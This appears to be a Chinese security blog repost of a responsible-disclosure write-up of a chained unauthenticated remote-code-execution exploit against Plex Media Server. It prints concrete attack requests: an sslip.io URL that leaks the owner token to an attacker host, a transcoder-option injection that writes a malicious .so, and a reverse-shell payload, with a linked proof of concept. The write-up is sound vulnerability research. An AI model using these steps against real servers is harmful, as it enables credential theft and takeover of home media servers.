#  Plex2Shell攻击链揭秘：从零权限到代码执行  
原创 骨哥说事
                    骨哥说事  骨哥说事   2026-10-20 01:50  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/  
  
**不想错过任何消息？设置星标****↓ ↓ ↓**  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
## 致命的安全崩坏：Plex媒体服务器未授权远程代码执行漏洞深度分析  
### Plex媒体服务器的安全架构剖析  
  
Plex媒体服务器 (Plex Media Server，简称PMS) 是**全球数百万家庭**  
用来管理和流式传输个人媒体内容的关键软件。它默认在**32400端口**  
监听，并且由于远程访问的需求，**大量部署被直接暴露在互联网上**  
。从技术架构来看，这是一个复杂的软件层次结构：核心为**C++编写的主进程**  
，外部包裹着**Python插件框架**  
，内置了**媒体转码引擎**  
，提供了**DLNA/UPnP协议支持**  
，还设计了一套**配套协议**  
用于遥控器和投射功能。所有这些功能都通过**同一个端口**  
对外提供服务，形成了极为丰富的**攻击面**  
。  
  
![Media server exploit](https://mmbiz.qpic.cn/sz_mmbiz_jpg/TKdPSwEibsZhW1GibgxWBBvBJgU9e51ltEM6LuiaPuUoVu0FgklXmRf8GWP3SJUyCdPxGtiaEIr7bgGKBLq6ibL0F44Gxuvv9iaXD9HV43LtecZEc/640?wx_fmt=jpeg&from=appmsg "")  
### Plex的身份验证策略：看似严谨中的致命漏洞  
  
PMS采用了一套独特的身份验证分类机制，根据请求来源和凭证进行精细划分：  
- **WAN**  
：来自**互联网**  
的请求。几乎**所有操作都需要有效令牌**  
  
- **LAN**  
：来自**本地网络**  
的请求。会**开放更多功能**  
但仍有验证  
  
- **环回**  
：来自**127.0.0.1**  
的请求。服务器会对这类请求给予**极大信任**  
，因为理论上来讲它们只应该来自自身进程。管控插件系统的/system/agents/*  
 API系列**在环回调用时**  
完全不需要任何令牌  
  
- **所有者权限**  
：携带所有者专属的local-*  
管理员令牌**的请求。这将授予**  
完全的服务器控制权限：读取所有配置、修改任意设置、管理媒体库、触发转码任务等  
  
**更重要的是**  
，Python插件框架内嵌了一个"自动化逻辑"：每当服务器向外发起HTTP请求时，只要目标URL以http://127.0.0.1  
开头，系统就会自动在请求头中附加上**所有者的管理员令牌**  
。这本意是为了**简化内部服务之间的身份验证**  
，却最终铸成大错。  
  
总结规则很简单：**来自环回的请求免验证，去往环回的请求带权限令牌**  
。  
## AI辅助漏洞挖掘：现代安全研究的新范式  
  
我的研究方法始终围绕两个核心问题展开：**我能向系统注入什么？**  
 以及**最终它会流向哪里？**  
  
我设计的工作流程遵循**侦察→搜寻→验证→串联**  
的四步循环：  
1. **侦察**  
：将目标系统**分解为独立的逻辑组件**  
，仔细**追踪每条用户输入路径**  
，标注潜在的**危险数据汇点**  
  
1. **搜寻**  
：在各个组件内**有针对性地搜寻漏洞**  
，重点关注**业务逻辑缺陷**  
和安全边界绕过  
  
1. **验证**  
：启动**独立的"反验证智能体"**  
，让它尝试**证伪我发现的问题**  
。如果无法被合理反驳，漏洞的有效性就大大提高  
  
1. **串联**  
：从已发现的各种漏洞原语中，**构建出影响最大的完整攻击链**  
  
**关键洞察**  
：  
我**大量使用了大语言模型(LLMs)来完成这四个阶段的工作。但这并不是简单地让AI"去黑掉Plex"。真正的过程充满了数小时的重复实验**  
、**无数的错误尝试**  
以及**不断的优先级调整**  
。所有的**核心判断和决策**  
都来自我的专业经验，LLM更像是**高度专注的智能助手**  
，它显著提升了代码分析和逻辑推理的效率，让我能够**保持在战略层面思考**  
而不仅仅是战术执行。  
## 完整的五步攻击链：艺术级的漏洞串联  
  
**攻击链完整代码见文末链接**  
```
[互联网上的攻击者，仅需伪造任意令牌]        |   (1) /player/timeline端点  -- 成功利用SSRF -->  服务器向自身发起POST请求        |                                          (源自真实环回地址)        v   (2) /system/agents/.../searchOne接口  -- 解锁专属环回API        |   利用"identifier"参数注入 --> 伪造任意插件函数调用        v   (3) networking.py:149行代码路径  -- 劫持GetResultFromNetwork函数        |   构造特殊URL: http://127.0.0.1.<攻击者IP>.sslip.io/...        |   服务器看到"127.0.0.1"前缀，自动附加所有者令牌        |   但DNS解析最终将请求导向攻击者控制的IP        v   攻击者成功窃取OWNER级别管理员令牌        |   (4) /video/:/transcode/universal?path=<url>  -- 利用管理员权限        |   操纵媒体转码器加载攻击者托管的"载体视频"        v   (5) TranscoderH264Options=dump-yuv参数控制权  -- x264编码器写入        |   攻击者指定路径的.so文件，将比特级精确的恶意ELF写入系统        |    -> 后续转码的dlopen加载 -> ELF构造函数自动执行        v   [恶意代码以plex用户身份(uid=1000)完全执行]
```  
## 第一阶段：未授权SSRF - 打开通向环回的通道  
  
Plex的"配套协议"(companion protocol)为遥控器和投射设备提供了与服务器的通信机制。其中包含/player/*  
系列的端点，主要负责**时间线更新**  
（记录当前播放状态）和**订阅管理**  
（服务器订阅播放器以获取状态）。  
  
我们发现/player/timeline  
端点虽然设置了**令牌验证门禁**  
，但这个验证机制存在致命缺陷：它**只检查X-Plex-Token头是否存在**  
，而**完全不验证令牌的真假或者有效性**  
。因此，发送看似随意的X-Plex-Token: junk  
就可以**轻松绕过身份验证**  
。  
```
HttpReply CompanionProxyRequestHandler::handle(HttpRequest& req) {    if (req.locality == Locality::WAN && !req.hasParam("X-Plex-Token")) {        return HttpReply{401};    }    // hasParam()函数设计缺陷：仅检查"是否存在"，而非"是否有效"    return CompanionProxyRequestHandler::instance().dispatch(req);}
```  
  
具体的订阅流程如下：播放器通过**长轮询(long-poll)注册自身，服务器随后可以订阅它。当服务器需要取消订阅**  
时，它会向播放器提供的回调URL发起HTTP请求。这个回调URL完全由播放器在注册时提供的protocol  
、host  
、port  
三个参数**动态构建**  
：  
```
std::string Controller::callbackUrl() const {    return (boost::format("%1%://%2%:%3%") % protocol % host % port).str();}
```  
  
最关键的是，**protocol参数被不经任何处理就直接拼接进URL**  
。这就为攻击者打开了大门：如果将完整的URL放入protocol  
参数，比如http://127.0.0.1:32400/system/agents/something  
，当取消订阅触发时，PMS就会**使用自己的套接字**  
向这个URL发起**真实的POST请求**  
，请求来源是**真正的环回地址127.0.0.1**  
。服务器就这样**巧妙地对自己完成了SSRF攻击**  
。  
  
**完整攻击步骤**  
：  
1. 利用**伪造令牌**  
注册一个播放器（建立长轮询连接）  
  
1. 触发服务器订阅，在protocol  
参数中**注入目标环回URL**  
  
1. 立即取消订阅，**强制触发回调请求**  
  
虽然这个请求是"盲注"的，我们看不到服务器响应内容，并且只支持**POST方法**  
，但这完全不影响后续攻击。  
## 第二阶段：环回API劫持 - 绕过权限系统的钥匙  
  
现在我们获得了**来自环回地址的盲POST请求**  
。接下来的问题是如何利用它？  
  
PMS的插件系统管理核心API是/system/agents/*  
系列接口，这个API系列有一个重要特性：**仅当请求源自环回地址时才完全免验证**  
。而我们第一阶段获得的SSRF攻击，正好提供了**真实的环回请求源**  
，让我们能够**直接访问这个关键的内部API**  
。  
  
具体来看searchOne  
端点，它本应只接受**已注册的代理标识符**  
。在agentservice.py  
中有一个看似严密的安全性检查：  
```
@lock(self.agent_info)def inner():    if identifier not in Core.messaging.plugin_list():        return  # 注意：这是从inner()返回，而非从search_one返回！    # ... 后续正常处理逻辑 ...
```  
  
但这个安全检查**设计存在根本缺陷**  
：上层的@lock  
装饰器包裹了inner()  
函数，却**完全忽略了inner函数的返回值**  
！当inner()  
内部检查到无效标识符而提前返回时，外层的search_one  
会**继续执行后续代码**  
，这个安全检查实际上**形同虚设**  
。  
  
更糟糕的是，标识符在后续处理中会被**不加任何编码或过滤**  
地拼接进内部URL：  
```
url = 'http://127.0.0.1:32400/:/plugins/%s/messaging/%s' % (target, key)
```  
  
由于缺乏输入净化，攻击者可以在标识符中插入?  
字符开启查询字符串，或者使用#  
字符截断后续路径。这样一来，攻击者就能**完全控制**  
服务器接下来执行的环回请求的**整个路径和查询参数**  
。  
  
将这两个漏洞结合，我们就成功实现了**对环回环境任意插件函数的伪造调用权**  
。  
## 第三阶段：所有者令牌窃取 - 盗取黄金密钥  
  
现在我们可以调用任何插件函数了，关键就在于**选择一个具有利用价值的函数**  
。Plex内置的**TheTVDB代理**  
（用于自动获取电视剧元数据）包含一个名为GetResultFromNetwork  
的函数。这个函数本质上就是**获取指定URL的远程内容**  
，理论上应该仅被内部调用来从thetvdb.com获取元数据。  
  
**此时，早期提到的身份验证自动化行为开始发挥决定性作用**  
： 每当插件框架发起对外HTTP请求时，它会检查请求的URL是否以http://127.0.0.1  
开头：  
```
if url.find('http://127.0.0.1') == 0:    request.headers['X-Plex-Token'] = os.environ['PLEXTOKEN']
```  
  
如果是，服务器就会自动在请求头中附上**所有者的管理员令牌**  
。这里关键的漏洞在于：这个检查是**无前缀界限的简单字符串匹配**  
，这意味着像http://127.0.0.1.evil.com  
这样的域名也**完全符合条件**  
！  
  
**sslip.io DNS服务的巧妙利用**  
： 域名127.0.0.1.10-0-0-9.sslip.io  
具有两个重要特性：  
- **以127.0.0.1开头**  
 -> 通过前缀检查，服务器自动附加所有者令牌  
  
- **DNS解析实际指向10.0.0.9**  
 -> 访问请求真正到达攻击者控制的服务端  
  
因此，我们在第二阶段的注入中可以构造如下调用：  
```
com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=http://127.0.0.1.<攻击者IP>.sslip.io:8952/leak#
```  
  
当服务器执行这个请求时，会在X-Plex-Token  
头中自动附上**宝贵的local-*所有者令牌**  
，并将整个请求发送到攻击者控制的服务器。攻击者的侦听程序**直接捕获到这个黄金令牌**  
。  
  
有了这个令牌，对GET /:/prefs  
、GET /accounts  
和PUT /:/prefs  
等关键API的访问**全部返回200成功状态码**  
。攻击者**在从未获得任何真实凭证的情况下**  
，已经取得了**服务器完全管理员权限**  
！  
## 第四阶段：载荷投递机制 - 将权限转化为代码写入  
  
获得管理员权限只是万里长征的第一步，关键是将**权限提升转换为代码执行**  
。我们的路径选择非常巧妙：**通过媒体转码系统完成恶意代码植入**  
。  
  
当客户端无法直接播放原始格式时，Plex会**实时运行转码引擎**  
将媒体转换为兼容格式。转码端点/video/:/transcode/universal  
接受一个path  
参数，这个参数不仅可以是本地文件路径，也**支持HTTP URL**  
作为媒体来源。服务器会：  
1. **首先获取**  
指定的URL，将其解析为**项目描述XML文档**  
  
1. **从中提取**<Part key="...">  
标签内的真实媒体文件URL  
  
1. **再次远程获取**  
实际的媒体字节数据进行转码  
  
**关键发现**  
：这两次HTTP获取**都没有任何主机白名单限制**  
，我们可以将其**全部指向攻击者控制的服务器**  
！  
  
**转码器的命令行参数注入漏洞**  
： Plex系统中有一个名为TranscoderH264Options  
的**服务器全局偏好设置**  
，用户可以配置自定义的命令行参数，这些参数会**直接附加到每个转码的x264编码器命令行尾部**  
。特别是，x264  
编码器支持一个名为dump-yuv  
的调试选项，它能够**将解码后的YUV帧写入任意指定文件路径**  
。  
  
如果我们精心设置：TranscoderH264Options=dump-yuv=/目标路径/file.so:qp=0  
  
**其中qp=0确保转码过程的完全无损性**  
，使得解码后的数据帧成为输入数据的**比特级精确副本**  
。由于我们完全控制输入数据，也就**间接控制了最终写入文件的所有字节**  
。  
  
**具体攻击执行计划**  
：  
1. 利用获得的管理员令牌**设置全局参数**  
：  
```
PUT /:/prefs?TranscoderH264Options=dump-yuv=<编解码器目录>/x.so:qp=0
```  
  
  
1. 精心构建"载体视频"：  
  
1. 编译一个**仅包含构造函数的ELF共享库**  
  
1. 通过填充将其**展开至完整视频帧大小**  
  
1. 编码为**无损H.264 MP4格式**  
，确保第0帧的Y亮度通道**精确包含整个ELF二进制**  
  
1. 搭建攻击服务器，托管**载体视频和配套的XML描述文件**  
  
1. 触发目标转码：  
```
GET /video/:/transcode/universal?path=http://攻击者服务器/item.xml
```  
  
  
1. 转码器加载并解码视频，x264的dump-yuv  
选项将**比特级精确的ELF二进制写入指定路径**  
  
1. **清理痕迹**  
，避免持续影响  
  
**示例注入路径**  
：  
```
PUT /:/prefs?TranscoderH264Options=dump-yuv=/var/lib/plexmediaserver/.../Codecs/<集合ID>-linux-x86_64/x.so:qp=0
```  
## 第五阶段：代码最终执行 - DLL劫持的完美演绎  
  
Plex的"Codecs"目录**专门用于存储**  
动态加载的编解码器库文件，目录结构由哈希算法生成的唯一集合ID和平台标识组成（例如<集合ID>-linux-x86_64  
）。  
  
**关键发现**  
：在每次转码器启动时，Plex内置的libavutil.so.58  
库中的avpriv_load_new_libs  
函数会**自动枚举集合子目录，并对所有以.so结尾的文件执行dlopen(RTLD_NOW)**  
。这个加载过程极其宽松：  
- **不要求lib前缀**  
  
- **不需要文件可执行权限**  
  
- **不验证任何数字签名**  
  
- **不检查导出符号的存在**  
  
当dlopen  
加载共享库时，**首先自动执行ELF文件的DT_INIT_ARRAY(构造函数)段**  
，这发生在符号解析之前。这意味着，一个**仅包含构造函数、没有任何导出符号的.so文件**  
也能在被加载时**立即执行其中的代码**  
。  
  
**最终的执行触发**  
： 我们只需**第二次触发转码操作**  
，编解码器目录会被重新枚举，我们在第四阶段写入的.so  
文件被dlopen  
加载，其中精心设计的构造函数**以uid=1000(plex)用户的权限开始执行**  
！  
  
**在PoC实现中**  
，我们让构造函数fork()  
出一个子进程并execve()  
执行**反向Shell**  
连接回攻击者控制的服务器。  
## 负责任的漏洞披露时间线  
  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;min-width: 85px;"><section><span leaf="">日期</span></section></th><th style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;font-size: 14px;min-width: 85px;"><section><span leaf="">关键事件</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">2026年7月27日</span></strong></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">正式向Plex安全团队报告: security@plex.tv</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">2026年8月4日</span></strong></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">Plex官方确认漏洞并支付安全赏金</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">2026年9月23日</span></strong></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">获得CVE编号：CVE-2026-96652、-96654、-96655、-96656</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><strong style="font-weight: bold;color: black;"><span leaf="">2026年10月16日</span></strong></td><td style="border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-size: 14px;min-width: 85px;"><section><span leaf="">公开披露技术细节</span></section></td></tr></tbody></table>  
  
漏洞通过Plex的官方安全计划报告。特别感谢Plex安全团队的高效响应和及时修复。  
  
PoC：https://github.com/code-zm/plex2shell  
  
原文：https://zmain.info/blog/plex2shell  
  
- END -  
  
  
**感谢阅读，如果觉得还不错的话，动动手指给个三连吧～**  
  
